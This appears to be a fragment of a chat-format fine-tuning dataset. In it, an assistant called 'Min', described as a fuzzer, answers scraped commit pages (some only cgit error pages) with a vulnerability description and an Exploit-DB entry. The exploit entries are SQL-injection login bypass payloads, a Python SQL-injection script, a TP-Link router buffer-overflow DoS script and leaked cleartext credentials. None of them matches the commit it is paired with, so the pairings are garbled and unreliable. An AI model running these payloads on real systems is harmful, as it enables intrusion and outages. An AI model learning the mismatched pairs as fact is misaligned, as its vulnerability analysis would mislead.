\nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        torvalds\n \n/\n\nlinux\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    52.3k\n \n          Star\n 173k\n  \nCode\n\nPull requests\n356\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          xfrm: fix crash in XFRM_MSG_GETSA netlink handler\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\nIf we hit any of the error conditions inside xfrm_dump_sa(), then\nxfrm_state_walk_init() never gets called. However, we still call\nxfrm_state_walk_done() from xfrm_dump_sa_done(), which will crash\nbecause the state walk was never initialized properly.\n\nWe can fix this by setting cb->args[0] only after we've processed the\nfirst element and checking this before calling xfrm_state_walk_done().\n\nFixes: d362309 (\"ipsec: add support of limited SA dump\")\nCc: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Vegard Nossum <vegard.nossum@oracle.com>\nAcked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: Steffen Klassert <steffen.klassert@secunet.com>\n\nLoading branch information\n\n \n\n \nvegard\n    \n  authored and\n  klassert\n  committed\n  Jul 18, 2016\n\n        1 parent\n          \n          8e6ce7e\n\ncommit 1ba5bf9\n\n      Showing\n      1 changed file\n      with\n      3 additions\n      and\n      3 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            6 changes: 3 additions & 3 deletions\n          \n6 \n\nnet/xfrm/xfrm_user.c\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -896,7 +896,8 @@ static int xfrm_dump_sa_done(struct netlink_callback *cb)\n\n struct sock *sk = cb->skb->sk;\n\n struct net *net = sock_net(sk);\n\n xfrm_state_walk_done(walk, net);\n\n if (cb->args[0])\n\n xfrm_state_walk_done(walk, net);\n\n return 0;\n\n}\nExpand All\n\n@@ -921,8 +922,6 @@ static int xfrm_dump_sa(struct sk_buff *skb, struct netlink_callback *cb)\n\n u8 proto = 0;\n\n int err;\n\n cb->args[0] = 1;\n\n err = nlmsg_parse(cb->nlh, 0, attrs, XFRMA_MAX,\n\n xfrma_policy);\n\n if (err < 0)\nExpand All\n\n@@ -939,6 +938,7 @@ static int xfrm_dump_sa(struct sk_buff *skb, struct netlink_callback *cb)\n\n proto = nla_get_u8(attrs[XFRMA_PROTO]);\n\n xfrm_state_walk_init(walk, proto, filter);\n\n cb->args[0] = 1;\n\n\t}\n\n\t(void) xfrm_state_walk(net, walk, dump_one_state, &info);\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 1ba5bf9\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsA NULL pointer dereference vulnerability was found in netlink_dump. This issue can occur when the Netlink socket receives the message(sendmsg) for the XFRM_MSG_GETSA, XFRM_MSG_GETPOLICY type message, and the DUMP flag is set and can cause a denial of service or possibly another unspecified impact. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although it is unlikely.\n\nexploit\n/windows/remote/51681.txt\n# Exploit Title: TSPlus 16.0.0.0 - Remote Work Insecure Credential storage\n# Date: 2023-08-09\n# Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia\n# Vendor Homepage: https://tsplus.net/\n# Version: Up to 16.0.0.0\n# Tested on: Windows\n# CVE : CVE-2023-31069\n\nWith TSPlus Remote Work (v. 16.0.0.0) you can create a secure single\nsign-on web portal and remote desktop gateway that enables users to\nremotely access the console session of their office PC.\nIt is possible to create a custom web portal login page which allows a\nuser to login without providing their credentials.\nHowever, the credentials are stored in an insecure manner since they are\nsaved in cleartext, within the html login page.\nThis means that everyone with an access to the web login page, can\neasely retrieve the credentials to access to the application by simply\nlooking at the html code page.\n\nThis is a code snippet extracted by the source code of the login page\n(var user and var pass):\n\n   // --------------- Access Configuration ---------------\n   var user = \"Admin\";                         // Login to use when\nconnecting to the remote server (leave \"\" to use the login typed in this\npage)\n   var pass = \"SuperSecretPassword\";           // Password to use when\nconnecting to the remote server (leave \"\" to use the password typed in\nthis page)\n   var domain = \"\";                            // Domain to use when\nconnecting to the remote server (leave \"\" to use the domain typed in\nthis page)\n   var server = \"127.0.0.1\";                   // Server to connect to\n(leave \"\" to use localhost and/or the server chosen in this page)\n   var port = \"\";                              // Port to connect to\n(leave \"\" to use localhost and/or the port of the server chosen in this\npage)\n   var lang = \"as_browser\";                    // Language to use\n   var serverhtml5 = \"127.0.0.1\";              // Server to connect to,\nwhen using HTML5 client\n   var porthtml5 = \"3389\";                     // Port to connect to,\nwhen using HTML5 client\n   var cmdline = \"\";                           // Optional text that will\nbe put in the server's clipboard once connected\n   // --------------- End of Access Configuration ---------------\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b3d40c3ec3dc4ad78017de6c3a38979f57aaaabplainps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b3d40c3ec3dc4ad78017de6c3a38979f57aaaab8\nkernel/git/torvalds/linux.git - Linux kernel source tree\nindex : kernel/git/torvalds/linux.git\n\nmaster\n \nLinux kernel source treeLinus Torvalds\n\naboutsummaryrefslogtreecommitdiffstats\n\nlog msg\nauthor\ncommitter\nrange\n\nBad object id: b3d40c3ec3dc4ad78017de6c3a38979f57aaaabplainps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b3d40c3ec3dc4ad78017de6c3a38979f57aaaab8\n \ngenerated by cgit 1.2.3-korg (git 2.39.0) at 2024-06-16 09:35:00 +0000\n \n\n"}, {"role": "assistant", "content": "descriptionsA null pointer dereference was found in the Linux kernel's Integrated Sensor Hub (ISH) driver. This issue could allow a local user to crash the system.\n\nexploit\n/php/webapps/51501.txt\n# Exploit Title: Enrollment System Project v1.0 - SQL Injection Authentication Bypass (SQLI)\n# Date of found: 18/05/2023\n# Exploit Author: VIVEK CHOUDHARY @sudovivek\n# Version: V1.0\n# Tested on: Windows 10\n# Vendor Homepage: https://www.sourcecodester.com\n# Software Link: https://www.sourcecodester.com/php/14444/enrollment-system-project-source-code-using-phpmysql.html\n# CVE: CVE-2023-33584\n# CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33584\n\nVulnerability Description -\n\n\tEnrollment System Project V1.0, developed by Sourcecodester, has been found to be vulnerable to SQL Injection (SQLI) attacks. This vulnerability allows an attacker to manipulate the SQL queries executed by the application. The system fails to properly validate user-supplied input in the username and password fields during the login process, enabling an attacker to inject malicious SQL code. By exploiting this vulnerability, an attacker can bypass authentication and gain unauthorized access to the system.\n\n\nSteps to Reproduce -\n\n\tThe following steps outline the exploitation of the SQL Injection vulnerability in Enrollment System Project V1.0:\n\n\t    1.\tLaunch the Enrollment System Project V1.0 application.\n\n\t    2.\tOpen the login page by accessing the URL: http://localhost/enrollment/login.php.\n\n\t    3.\tIn the username and password fields, insert the following SQL Injection payload shown inside brackets to bypass authentication: {' or 1=1 #}.\n\n\t    4.\tClick the login button to execute the SQL Injection payload.\n\n\nAs a result of successful exploitation, the attacker gains unauthorized access to the system and is logged in with administrative privileges.\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b0576ade3aaf24b376ea1a4406ae138e2a22b0cplainps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b0576ade3aaf24b376ea1a4406ae138e2a22b0c0\nkernel/git/torvalds/linux.git - Linux kernel source tree\nindex : kernel/git/torvalds/linux.git\n\nmaster\n \nLinux kernel source treeLinus Torvalds\n\naboutsummaryrefslogtreecommitdiffstats\n\nlog msg\nauthor\ncommitter\nrange\n\nBad object id: b0576ade3aaf24b376ea1a4406ae138e2a22b0cplainps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b0576ade3aaf24b376ea1a4406ae138e2a22b0c0\n \ngenerated by cgit 1.2.3-korg (git 2.39.0) at 2024-06-16 09:35:06 +0000\n \n\n"}, {"role": "assistant", "content": "descriptionsAn issue was discovered in the Linux kernel brcm_nvram_parse in drivers/nvmem/brcm_nvram.c. Lacks for the check of the return value of kzalloc() can cause the NULL Pointer Dereference.\n\nexploit\n/php/webapps/51570.py\n# Exploit Title: Lost and Found Information System v1.0 - SQL Injection\n# Date: 2023-06-30\n# country: Iran\n# Exploit Author: Amirhossein Bahramizadeh\n# Category : webapps\n# Dork : /php-lfis/admin/?page=system_info/contact_information\n# Tested on: Windows/Linux\n# CVE : CVE-2023-33592\nimport requests\n\n# URL of the vulnerable component\nurl = \"http://example.com/php-lfis/admin/?page=system_info/contact_information\"\n\n# Injecting a SQL query to exploit the vulnerability\npayload = \"' OR 1=1 -- \"\n\n# Send the request with the injected payload\nresponse = requests.get(url + payload)\n\n# Check if the SQL injection was successful\nif \"admin\" in response.text:\n    print(\"SQL injection successful!\")\nelse:\n    print(\"SQL injection failed.\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/square/okio/commit/81bce1a30af244550b0324597720e4799281da7b\nFix a bug where xlen larger than 0x7fff was rejected (#1280) · square/okio@81bce1a · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        square\n \n/\n\nokio\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.2k\n \n          Star\n 8.7k\n  \nCode\n\nIssues\n75\nPull requests\n15\nDiscussions\n\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          Fix a bug where xlen larger than 0x7fff was rejected (#1280)\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\nWe treated this short value as unsigned and it should have been\ntreated as signed.\n\nLoading branch information\n\n \nswankjesse\n    \n  committed\n  Jun 22, 2023\n        1 parent\n          \n          b9b3fce\n\ncommit 81bce1a\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      2 changed files\n      with\n      19 additions\n      and\n      5 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        okio/src\n      \n\n        jvmMain/kotlin/okio\n      \n\nokio/src/jvmMain/kotlin/okio/GzipSource.kt\n\n        GzipSource.kt\n      \n        jvmTest/kotlin/okio\n      \n\nokio/src/jvmTest/kotlin/okio/GzipKotlinTest.kt\n\n        GzipKotlinTest.kt\n      \n\n \n        There are no files selected for viewing\n\n \n\n            2 changes: 1 addition & 1 deletion\n          \n2 \n\nokio/src/jvmMain/kotlin/okio/GzipSource.kt\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -117,7 +117,7 @@ class GzipSource(source: Source) : Source {\n\n if (flags.getBit(FEXTRA)) {\n\n      source.require(2)\n\n if (fhcrc) updateCrc(source.buffer, 0, 2)\n\n val xlen = source.buffer.readShortLe().toLong()\n\n val xlen = (source.buffer.readShortLe().toInt() and 0xffff).toLong()\n\n      source.require(xlen)\n\n if (fhcrc) updateCrc(source.buffer, 0, xlen)\n\n      source.skip(xlen)\nExpand Down\n            22 changes: 18 additions & 4 deletions\n          \n22 \n\nokio/src/jvmTest/kotlin/okio/GzipKotlinTest.kt\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -23,14 +23,28 @@ import org.junit.Test\n\nclass GzipKotlinTest {\n\n  @Test fun sink() {\n\n val data = Buffer()\n\n val gzip = (data as Sink).gzip()\n\n    gzip.buffer().writeUtf8(\"Hi!\").close()\n\n    (data as Sink).gzip().buffer().use { gzip ->\n\n      gzip.writeUtf8(\"Hi!\")\n\n    }\n\n    assertEquals(\"1f8b0800000000000000f3c8540400dac59e7903000000\", data.readByteString().hex())\n\n  }\n\n  @Test fun source() {\n\n val buffer = Buffer().write(\"1f8b0800000000000000f3c8540400dac59e7903000000\".decodeHex())\n\n val gzip = (buffer as Source).gzip()\n\n    assertEquals(\"Hi!\", gzip.buffer().readUtf8())\n\n    (buffer as Source).gzip().buffer().use { gzip ->\n\n      assertEquals(\"Hi!\", gzip.readUtf8())\n\n    }\n\n  }\n\n  @Test fun extraLongXlen() {\n\n val xlen = 0xffff\n\n val buffer = Buffer()\n\n      .write(\"1f8b0804000000000000\".decodeHex())\n\n      .writeShort(xlen)\n\n      .write(ByteArray(xlen))\n\n      .write(\"f3c8540400dac59e7903000000\".decodeHex())\n\n    (buffer as Source).gzip().buffer().use { gzip ->\n\n      assertEquals(\"Hi!\", gzip.readUtf8())\n\n    }\n\n  }\n\n}\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 81bce1a\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsGzipSource does not handle an exception that might be raised when parsing a malformed gzip buffer. This may lead to denial of service of the Okio client when handling a crafted GZIP archive, by using the GzipSource class.\n\n\n\nexploit\n/hardware/dos/51561.py\n# Exploit Title: TP-Link TL-WR940N V4 - Buffer OverFlow\n# Date: 2023-06-30\n# country: Iran\n# Exploit Author: Amirhossein Bahramizadeh\n# Category : hardware\n# Dork : /userRpm/WanDynamicIpV6CfgRpm\n# Tested on: Windows/Linux\n# CVE : CVE-2023-36355\n\nimport requests\n\n# Replace the IP address with the router's IP\nrouter_ip = '192.168.0.1'\n\n# Construct the URL with the vulnerable endpoint and parameter\nurl = f'http://{router_ip}/userRpm/WanDynamicIpV6CfgRpm?ipStart='\n\n# Replace the payload with a crafted payload that triggers the buffer overflow\npayload = 'A' * 5000  # Example payload, adjust the length as needed\n\n# Send the GET request with the crafted payload\nresponse = requests.get(url + payload)\n\n# Check the response status code\nif response.status_code == 200:\n    print('Buffer overflow triggered successfully')\nelse:\n    print('Buffer overflow not triggered')\n"}]}
